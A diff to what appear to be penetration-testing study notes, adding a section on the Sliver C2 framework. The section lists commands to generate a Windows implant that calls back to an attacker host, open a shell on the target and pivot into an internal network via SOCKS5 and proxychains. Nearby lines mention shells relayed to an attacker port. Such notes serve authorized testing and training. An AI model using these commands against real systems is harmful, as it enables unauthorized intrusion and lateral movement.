@@ -85,7 +85,35 @@ nmap -sT -p 88,389,445 10.10.10.100
 # Shells sent to VICTIM_IP:1234 will arrive at ATTACKER:4444
 ```
 
-## 10.4 Other Pivoting Tools
+## 10.4 Sliver C2
+
+```bash
+# Generate a Windows Implant 
+generate --mtls KALI_IP:443 --os windows --save /tmp/pivot.exe
+
+# Upload to target machine 
+mtls -L KALI_IP -l 443
+jobs 
+
+# Then run from Target
+./pivot.exe 
+
+sessions 
+sessions -i [session_id]
+shell
+
+# If exit from shell
+Ctrl + d
+
+# Pivot to internal network. Make sure proxychain configured. 
+socks5 start
+
+# Another terminal
+proxychains -q nmap 
+sudo proxychains -q nmap -sT -p80 -pn TARGET_IP
+```
+
+## 10.5 Other Pivoting Tools
 
 ```bash
 # Sshuttle — transparent proxy via SSH
